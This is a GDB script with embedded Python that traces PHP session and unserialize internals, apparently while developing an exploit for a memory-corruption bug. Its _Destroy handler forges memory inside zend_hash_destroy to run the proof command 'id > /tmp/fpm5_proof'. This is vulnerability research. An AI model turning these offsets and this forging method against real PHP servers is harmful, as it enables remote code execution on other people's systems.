set pagination off
set confirm off
set breakpoint pending on
set follow-fork-mode child
set detach-on-fork on
set logging file /tmp/probe_ht.log
set logging overwrite on
set logging enabled on

python
import gdb

ZIF = 0x555555a0e3a0

def u64(a):
    try:
        if not a:
            return 0
        return int.from_bytes(bytes(gdb.selected_inferior().read_memory(a, 8)), "little")
    except Exception:
        return 0

def u32(a):
    try:
        if not a:
            return 0
        return int.from_bytes(bytes(gdb.selected_inferior().read_memory(a, 4)), "little")
    except Exception:
        return 0

class _Flush(gdb.Breakpoint):
    def stop(self):
        try:
            ps = int(gdb.parse_and_eval("&ps_globals"))
            z = u64(ps + 0x168)
            arr = u64(z + 8) if z else 0
            if arr:
                print("FLUSH ref=%#x arr=%#x pd=%#x ar=%#x nu=%d ne=%d htsz=%d" % (
                    z, arr, u64(arr + 0x30), u64(arr + 0x10),
                    u32(arr + 0x18), u32(arr + 0x1c), u32(arr + 0x20)))
        except Exception as e:
            print("FERR %s" % e)
        return False

class _Destroy(gdb.Breakpoint):
    def stop(self):
        try:
            ht = int(gdb.parse_and_eval("$rdi"))
            pd = u64(ht + 0x30)
            print("DEST ht=%#x pd=%#x ar=%#x nu=%d ne=%d htsz=%d%s" % (
                ht, pd, u64(ht + 0x10), u32(ht + 0x18), u32(ht + 0x1c),
                u32(ht + 0x20), " ZIF!" if pd == ZIF else ""))
            if pd == ZIF:
                ar = u64(ht + 0x10)
                cmd = b"id > /tmp/fpm5_proof"
                st = ar + 0xE0
                w = lambda o, v: gdb.selected_inferior().write_memory(
                    ar + o, int(v & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little"))
                w(0x00, 0); w(0x08, 1); w(0x10, 0); w(0x18, 0)
                w(0x20, 0); w(0x28, 0); w(0x30, 0); w(0x38, 0)
                w(0x40, 0); w(0x48, 0)
                w(0x50, st); w(0x58, 6)
                gdb.selected_inferior().write_memory(ar + 0x2C,
                    int(1).to_bytes(4, "little"))
                gdb.selected_inferior().write_memory(st + 0x10,
                    int(len(cmd)).to_bytes(8, "little"))
                gdb.selected_inferior().write_memory(st + 0x18, cmd)
                print("FRAMEWRITE ar=%#x st=%#x" % (ar, st))
        except Exception as e:
            print("DERR %s" % e)
        return False


class _W(gdb.Breakpoint):
    def stop(self):
        try:
            pc = int(gdb.parse_and_eval("$pc"))
            print("WDATA pc=%#x" % pc)
            gdb.execute("bt 5")
        except Exception as e:
            print("WERR %s" % e)
        return False

_WATCHES = []


class _Init(gdb.Breakpoint):
    def stop(self):
        try:
            bg = int(gdb.parse_and_eval("&basic_globals"))
            print("INIT lock=%d level=%d data=%#x" % (u32(bg + 0x350), u32(bg + 0x370), u64(bg + 0x368)))
        except Exception as e:
            print("INITERR %s" % e)
        return False

_Init("php_var_unserialize_init")

class _Bail(gdb.Breakpoint):
    def stop(self):
        try:
            bg = int(gdb.parse_and_eval("&basic_globals"))
            print("BAIL lock=%d level=%d data=%#x" % (u32(bg + 0x350), u32(bg + 0x370), u64(bg + 0x368)))
        except Exception as e:
            print("BAILERR %s" % e)
        return False

_Bail("_zend_bailout")

class _Set(gdb.Breakpoint):
    n = [0]
    watch = [False]
    def stop(self):
        try:
            nm_p = int(gdb.parse_and_eval("$rdi"))
            nm_s = ""
            if nm_p:
                try:
                    ln = int.from_bytes(bytes(gdb.selected_inferior().read_memory(nm_p + 0x10, 8)), "little")
                    if 0 < ln < 40:
                        nm_s = bytes(gdb.selected_inferior().read_memory(nm_p + 0x18, ln)).decode("latin-1")
                except Exception:
                    pass
            vh = int(gdb.parse_and_eval("$rdx"))
            rv = int(gdb.parse_and_eval("$rsi"))
            cur = u64(rv) if rv else 0
            vt = u32(cur + 8) & 0xff if cur else 0
            d = u64(vh) if vh else 0
            if d:
                ld = u64(d + 0x10)
                us = u64(ld) if ld else 0
                if us >= 0x8000000000000000:
                    us -= 0x10000000000000000
                ps = int(gdb.parse_and_eval("&ps_globals"))
                z = u64(ps + 0x168)
                arr = u64(z + 8) if z else 0
                self.n[0] += 1
                if not self.watch[0] and d != 0x7ffff63b9000 and arr:
                    print("WATCHARM at %#x (d=%#x)" % (arr + 0x10, d))
                    _WATCHES.append(_W("*%#x" % (arr + 0x10), gdb.BP_WATCHPOINT, gdb.WP_WRITE))
                    self.watch[0] = True
                print("SET#%d name='%s' d=%#x vt=%d ld=%#x us=%d tgt=%#x arr=%#x pd=%#x har=%#x" % (
                    self.n[0], nm_s, d, vt, ld, us, (ld + 0x10 + us * 16) & 0xFFFFFFFFFFFFFFFF,
                    arr, u64(arr + 0x30) if arr else 0, u64(arr + 0x10) if arr else 0))
        except Exception as e:
            print("SERR %s" % e)
        return False

_Set("php_set_session_var")





class _Buckets(gdb.Breakpoint):
    def stop(self):
        try:
            ps = int(gdb.parse_and_eval("&ps_globals"))
            z = u64(ps + 0x168)
            arr = u64(z + 8) if z else 0
            if arr:
                ar = u64(arr + 0x10)
                nu = u32(arr + 0x18)
                if ar and nu:
                    raw = bytes(gdb.selected_inferior().read_memory(ar, min(nu, 6) * 32))
                    for i in range(min(nu, 6)):
                        b = raw[i*32:(i+1)*32]
                        print("BUCKET %d val=%s h=%#x key=%#x cell=%s" % (
                            i, b[0:16].hex(), int.from_bytes(b[16:24], "little"),
                            int.from_bytes(b[24:32], "little"),
                            b[0x0C:0x10].hex() + "/" + b[0x2C:0x30].hex() if len(b) >= 0x30 else ""))
        except Exception as e:
            print("BERR %s" % e)
        return False

_Buckets("php_session_flush")


class _Find(gdb.Breakpoint):
    def stop(self):
        try:
            ht = int(gdb.parse_and_eval("$rdi"))
            key = int(gdb.parse_and_eval("$rsi"))
            ar = u64(ht + 0x10) if ht else 0
            nu = u32(ht + 0x18) if ht else 0
            nt = u32(ht + 0x20) if ht else 0
            nm = u32(ht + 0x0C) if ht else 0
            ks = ""
            if key:
                ln = int.from_bytes(bytes(gdb.selected_inferior().read_memory(key + 0x10, 8)), "little")
                if 0 < ln < 64:
                    ks = bytes(gdb.selected_inferior().read_memory(key + 0x18, ln)).decode("latin-1")
            h = u64(key + 0x08) if key else 0
            ni = ((h | nm) & 0xFFFFFFFF)
            si = ni if ni < 0x80000000 else ni - 0x100000000
            slot = ar + si * 4
            idx = u32(slot) if ar else 0
            print("FIND ht=%#x ar=%#x nm=%#x ni=%#x si=%d slot=%#x idx=%#x '%s'" % (
                ht, ar, nm, ni, si, slot, idx, ks))
        except Exception as e:
            print("FERR2 %s" % e)
        return False

_Find("zend_hash_find")



class _V5Ret(gdb.FinishBreakpoint):
    def stop(self):
        try:
            rv = int(self.return_value) if self.return_value is not None else int(gdb.parse_and_eval("$rax"))
            t = u32(rv + 8) & 0xff if rv else 0
            print("V5RET z=%#x type=%d" % (rv, t))
            if t == 6:
                st = u64(rv)
                print("V5STR str=%#x lenaddr=%#x len=%#x" % (st, st + 0x10, u64(st + 0x10)))
        except Exception as e:
            print("V5ERR %s" % e)
        return False

class _V5Find(gdb.Breakpoint):
    def stop(self):
        try:
            key = int(gdb.parse_and_eval("$rsi"))
            if key:
                ln = int.from_bytes(bytes(gdb.selected_inferior().read_memory(key + 0x10, 8)), "little")
                if 0 < ln < 8:
                    nm = bytes(gdb.selected_inferior().read_memory(key + 0x18, ln)).decode("latin-1")
                    if nm == "v5":
                        _V5Ret(gdb.newest_frame(), internal=True)
        except Exception:
            pass
        return False

_V5Find("zend_hash_find")


class _GetArr(gdb.Breakpoint):
    def stop(self):
        try:
            cg = int(gdb.parse_and_eval("&core_globals"))
            for off in range(0, 0x900, 8):
                z = cg + off
                try:
                    if (u32(z + 8) & 0xff) != 7:
                        continue
                    ht = u64(z)
                    ar = u64(ht + 0x10)
                    nu = u32(ht + 0x18)
                    if not ar or not (8 <= nu <= 20):
                        continue
                    names = []
                    hit = False
                    for i in range(min(nu, 20)):
                        b = ar + i * 0x20
                        key = u64(b + 0x18)
                        if not key:
                            continue
                        ln = u64(key + 0x10)
                        if 0 < ln < 8:
                            nm = bytes(gdb.selected_inferior().read_memory(key + 0x18, ln))
                            names.append(nm)
                            if nm.startswith(b"v"):
                                val = u64(b)
                                t = u32(b + 8) & 0xff
                                print("GETV %s z=%#x ht=%#x ar=%#x nu=%d val=%#x type=%d str=%#x lenaddr=%#x len=%#x" % (
                                    nm.decode(), z, ht, ar, nu, val, t, val, val + 0x10, u64(val + 0x10)))
                                hit = True
                    if b"v0" in names and not hit:
                        print("GETCAND z=%#x ht=%#x ar=%#x nu=%d names=%s" % (z, ht, ar, nu, names))
                except Exception:
                    pass
        except Exception as e:
            print("GETERR %s" % e)
        return False

_GetArr("php_session_flush")


class _SIDRet(gdb.FinishBreakpoint):
    def stop(self):
        try:
            rv = int(self.return_value) if self.return_value is not None else int(gdb.parse_and_eval("$rax"))
            t = u32(rv + 8) & 0xff if rv else 0
            print("SIDRET z=%#x type=%d" % (rv, t))
            if t == 6:
                st = u64(rv)
                ln = u64(st + 0x10)
                print("SIDSTR st=%#x lenaddr=%#x len=%#x data=%s" % (
                    st, st + 0x10, ln, bytes(gdb.selected_inferior().read_memory(st + 0x18, min(ln, 48)))))
            elif t == 13:
                ptr = u64(rv)
                print("SIDPTR rv=%#x ptr=%#x" % (rv, ptr))
                if ptr:
                    try:
                        ln = u64(ptr + 0x10)
                        print("SIDPTRSTR ptr=%#x lenaddr=%#x len=%#x data=%s" % (
                            ptr, ptr + 0x10, ln, bytes(gdb.selected_inferior().read_memory(ptr + 0x18, min(ln, 48)))))
                    except Exception as e:
                        print("SIDPTRERR %s" % e)
        except Exception as e:
            print("SIDERR %s" % e)
        return False

class _SIDFind(gdb.Breakpoint):
    def stop(self):
        try:
            key = int(gdb.parse_and_eval("$rsi"))
            if key:
                ln = u64(key + 0x10)
                if 0 < ln < 8:
                    nm = bytes(gdb.selected_inferior().read_memory(key + 0x18, ln))
                    if nm == b"SID":
                        _SIDRet(gdb.newest_frame(), internal=True)
        except Exception:
            pass
        return False

_SIDFind("zend_hash_find")


class _PSID(gdb.Breakpoint):
    def stop(self):
        try:
            ps = int(gdb.parse_and_eval("&ps_globals"))
            i = u64(ps + 0x10)
            print("PSID id=%#x" % i)
            if i:
                ln = u64(i + 0x10)
                print("PSIDSTR id=%#x lenaddr=%#x len=%#x data=%s" % (
                    i, i + 0x10, ln, bytes(gdb.selected_inferior().read_memory(i + 0x18, min(ln, 48)))))
        except Exception as e:
            print("PSIDERR %s" % e)
        return False

_PSID("php_session_flush")


class _Tmp(gdb.Breakpoint):
    def stop(self):
        try:
            vh = int(gdb.parse_and_eval("$rdi"))
            d = u64(vh) if vh else 0
            ld = u64(d + 0x10) if d else 0
            us = u64(ld) if ld else 0
            if us >= 0x8000000000000000:
                us -= 0x10000000000000000
            tgt = (ld + 0x10 + us * 16) & 0xFFFFFFFFFFFFFFFF if ld else 0
            print("TMP vh=%#x d=%#x ld=%#x us=%d tgt=%#x" % (vh, d, ld, us, tgt))
        except Exception as e:
            print("TMPERR %s" % e)
        return False

_Tmp("var_tmp_var")


class _Unser(gdb.Breakpoint):
    def stop(self):
        try:
            rv = int(gdb.parse_and_eval("$rdi"))
            pptr = int(gdb.parse_and_eval("$rsi"))
            vh = int(gdb.parse_and_eval("$rcx"))
            d = u64(vh) if vh else 0
            print("UNSER rv=%#x p=%#x vh=%#x d=%#x" % (rv, pptr, vh, d))
            if pptr:
                pp = u64(pptr)
                print("UNSERDATA p=%#x bytes=%s" % (pp, bytes(gdb.selected_inferior().read_memory(pp, 24)).hex()))
        except Exception as e:
            print("UNSERERR %s" % e)
        return False

_Unser("php_var_unserialize")

class _VD(gdb.Breakpoint):
    def stop(self):
        try:
            vh = int(gdb.parse_and_eval("$rdi"))
            d = u64(vh) if vh else 0
            rp = u64(d + 0x20) if d else 0
            lvl = u32(int(gdb.parse_and_eval("&basic_globals")) + 0x370)
            bgd = u64(int(gdb.parse_and_eval("&basic_globals")) + 0x368)
            print("VDEST vh=%#x d=%#x ref_props=%#x level=%u bgdata=%#x" % (vh, d, rp, lvl, bgd))
        except Exception as e:
            print("VERR %s" % e)
        return False

_VD("php_var_unserialize_destroy")


class _Upd(gdb.Breakpoint):
    armed = [False]
    def stop(self):
        try:
            ht = int(gdb.parse_and_eval("$rdi"))
            ar = u64(ht + 0x10) if ht else 0
            nu = u32(ht + 0x18) if ht else 0
            print("UPD ht=%#x ar=%#x nu=%d" % (ht, ar, nu))

        except Exception as e:
            print("UERR %s" % e)
        return False

_Upd("zend_hash_update")


class _NewArrRet(gdb.FinishBreakpoint):
    def stop(self):
        try:
            rv = self.return_value
            arr = int(rv) if rv is not None else int(gdb.parse_and_eval("$rax"))
            ar = u64(arr + 0x10)
            print("NEWARR arr=%#x ar=%#x" % (arr, ar))
        except Exception as e:
            print("NERR %s" % e)
        return False

class _NewArr(gdb.Breakpoint):
    def stop(self):
        try:
            _NewArrRet(gdb.newest_frame(), internal=True)
        except Exception as e:
            print("NERR2 %s" % e)
        return False

_NewArr("_zend_new_array_0")

_Flush("php_session_flush")
_Destroy("zend_hash_destroy")
end

run
printf "=== stopped pc=%p ===\n", $pc
bt 8
